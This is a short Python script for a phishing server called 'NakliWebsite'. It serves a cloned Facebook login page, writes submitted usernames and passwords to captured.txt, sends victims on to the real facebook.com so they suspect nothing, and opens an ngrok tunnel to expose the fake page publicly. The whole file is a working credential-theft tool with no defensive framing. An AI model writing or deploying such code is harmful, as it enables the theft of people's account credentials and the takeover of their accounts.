import http.server
import socketserver
import os
import subprocess
import urllib.parse
import time

PORT = 8080
TEMPLATE_DIR = 'sites/facebook/index.html'
CAPTURED_FILE = 'captured.txt'
NGROK_PATH = './ngrok'

class NakliHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            try:
                with open(TEMPLATE_DIR, 'r') as file:
                    html = file.read()
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(html.encode())
            except Exception as e:
                self.send_error(500, str(e))
        else:
            self.send_error(404, 'Page Not Found')

    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode()
            credentials = urllib.parse.parse_qs(post_data)

            username = credentials.get('username', [''])[0]
            password = credentials.get('password', [''])[0]

            with open(CAPTURED_FILE, 'a') as f:
                f.write(f"[Captured at {time.ctime()}] Username: {username} | Password: {password}\n")

            self.send_response(301)
            self.send_header('Location', 'https://facebook.com')
            self.end_headers()

def start_ngrok():
    try:
        subprocess.Popen([NGROK_PATH, 'http', str(PORT)])
        print("[*] Ngrok tunnel starting...")
        time.sleep(4)
        print("[*] Visit: https://dashboard.ngrok.com to get your URL")
    except Exception as e:
        print("[!] Ngrok failed to start:", e)

def main():
    print("[+] Starting NakliWebsite Server...")
    start_ngrok()
    with socketserver.TCPServer(('', PORT), NakliHandler) as server:
        print(f"[+] Server running at http://localhost:{PORT}")
        print("[!] Waiting for credentials...")
        server.serve_forever()

if __name__ == '__main__':
    main()
